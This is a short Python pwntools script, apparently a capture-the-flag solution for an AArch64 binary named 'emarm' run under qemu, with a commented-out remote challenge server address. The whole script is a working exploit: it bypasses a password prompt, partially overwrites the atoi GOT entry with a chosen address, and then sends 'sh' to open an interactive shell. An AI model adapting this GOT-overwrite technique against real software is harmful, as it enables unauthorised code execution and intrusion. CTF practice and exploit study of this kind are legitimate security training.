#coding:utf-8
from pwn import *
context.log_level = 'debug'
debug = 0
if debug == 0:
	p = process(['qemu-aarch64-static','-L','.','./emarm'])
# else:
#     p = process(['qemu-aarch64-static','-L','.','-g','1234','./emarm'])
atoi_got = '4268064'
#p = remote('183.129.189.60', 10012)
p.sendlineafter('passwd:\n', '\x001')
p.send(atoi_got)
p.sendafter('success', '\xc8\xf2\x86')
p.sendlineafter(' bye\n', 'sh')
p.interactive()

